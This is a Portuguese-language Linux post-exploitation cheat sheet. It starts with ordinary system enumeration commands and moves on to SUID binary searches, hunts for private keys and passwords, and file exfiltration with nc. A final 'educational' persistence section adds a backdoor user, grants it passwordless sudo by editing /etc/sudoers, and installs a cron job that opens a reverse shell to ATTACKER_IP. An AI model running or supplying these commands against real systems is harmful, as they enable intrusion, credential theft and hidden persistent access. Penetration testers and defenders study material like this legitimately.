## **O que é Shell?**
Um shell é um programa de interface de linha de comando que permite interagir com o sistema operacional Linux.

## **Comandos de reconhecimento do sistema**

```bash
# Informações do usuário
whoami                    # Usuário atual
id                        # Informações detalhadas do usuário e grupos
groups                    # Grupos do usuário atual
who                       # Usuários logados
w                         # Usuários logados e seus processos

# Informações do sistema
uname -a                  # Todas as informações do kernel
uname -r                  # Versão do kernel
cat /etc/issue            # Versão do SO
cat /etc/*-release        # Informações de release
hostname                  # Nome do host
arch                      # Arquitetura do processador

# Diretório atual
pwd                       # Diretório de trabalho atual
```

## **Informações de usuários e grupos**

```bash
cat /etc/passwd           # Lista todos os usuários
cat /etc/group            # Lista todos os grupos
getent passwd             # Entradas de usuários (inclui LDAP)
getent group              # Entradas de grupos
last                      # Histórico de logins
lastlog                   # Último login de cada usuário
```

## **Privilégios e permissões**

```bash
# Sudo
sudo -l                   # Comandos que podem ser executados com sudo
sudo -ll                  # Lista detalhada (algumas versões)

# SUID/GUID
find / -perm -u=s -type f 2>/dev/null        # Binários SUID
find / -perm -g=s -type f 2>/dev/null        # Binários GUID
find / -perm -4000 -type f 2>/dev/null       # Binários SUID (alternativa)

# Permissões de arquivos sensíveis
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

## **Processos e serviços**

```bash
ps aux                    # Todos os processos
ps -ef                    # Processos formato extendido
ps aux | grep root        # Processos rodando como root
top                       # Processos em tempo real
htop                      # Top melhorado (se disponível)
pstree                    # Árvore de processos

# Serviços
systemctl status --all    # Status de todos os serviços (systemd)
service --status-all      # Status serviços (SysV)
chkconfig --list          # Serviços configurados (Red Hat)
```

## **Rede e conexões**

```bash
ifconfig                  # Interfaces de rede
ip addr                   # Informações IP (moderno)
netstat -tulpn            # Conexões e portas abertas
ss -tulpn                 # Alternativa moderna ao netstat
lsof -i                   # Processos usando rede
route -n                  # Tabela de roteamento
arp -a                    # Tabela ARP
```

## **Informações do sistema**

```bash
# Hardware
lscpu                     # Informações da CPU
lsblk                     # Discos e partições
df -h                     # Espaço em disco
free -h                   # Memória RAM
lspci                     # Dispositivos PCI
lsusb                     # Dispositivos USB

# Variáveis de ambiente
env                       # Todas as variáveis
echo $PATH                # PATH do sistema
echo $HOME                # Diretório home
set                       # Variáveis shell
```

## **Busca de arquivos sensíveis**

```bash
# Arquivos de configuração
find / -name "*.conf" -type f 2>/dev/null
find / -name "*.pem" -type f 2>/dev/null
find / -name "*.key" -type f 2>/dev/null
find / -name "id_rsa" -type f 2>/dev/null
find / -name "*.sql" -type f 2>/dev/null

# Arquivos com permissões específicas
find / -writable -type d 2>/dev/null         # Diretórios graváveis
find / -readable -type f 2>/dev/null         # Arquivos legíveis
find / -perm -o=w -type d 2>/dev/null        # Diretórios graváveis por outros
```

## **Histórico e logs**

```bash
history                    # Histórico de comandos
cat ~/.bash_history        # Histórico do bash
tail -f /var/log/auth.log  # Logs de autenticação (Debian/Ubuntu)
tail -f /var/log/secure    # Logs de autenticação (Red Hat)
dmesg                      # Mensagens do kernel
journalctl                 # Logs do systemd
```

## **Cron jobs e agendamentos**

```bash
crontab -l                 # Cron jobs do usuário atual
ls -la /etc/cron*          # Diretórios de cron
cat /etc/crontab           # Crontab do sistema
ls -la /etc/cron.d/*       # Jobs de cron adicionais
systemctl list-timers      # Timers do systemd
```

## **Informações de segurança**

```bash
getenforce                 # Status SELinux (Red Hat)
sestatus                   # Status detalhado SELinux
apparmor_status            # Status AppArmor (Debian/Ubuntu)
iptables -L                # Regras iptables
ufw status                 # Status UFW
```

## **Comandos úteis para escalação**

```bash
# Busca por credenciais
grep -r "password" /etc 2>/dev/null
grep -r "Password" /home 2>/dev/null
find / -name "*.bak" -type f 2>/dev/null

# Informações de containers/VMs
docker ps -a              # Containers Docker
ls -la /.dockerenv        # Verifica se está em container
systemd-detect-virt       # Detecta virtualização
```

## **Ferramentas de transferência de arquivos**

```bash
# Download
wget http://exemplo.com/arquivo
curl -O http://exemplo.com/arquivo

# Upload (dependendo do que estiver disponível)
scp arquivo user@host:/path/
nc -w 3 host port < arquivo
```

## **Comandos de persistência (para fins educativos)**

```bash
# Adicionar usuário
useradd -m -s /bin/bash backdoor
echo "backdoor:senha" | chpasswd

# Adicionar ao sudo
echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Cron job persistente
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" | crontab -
```
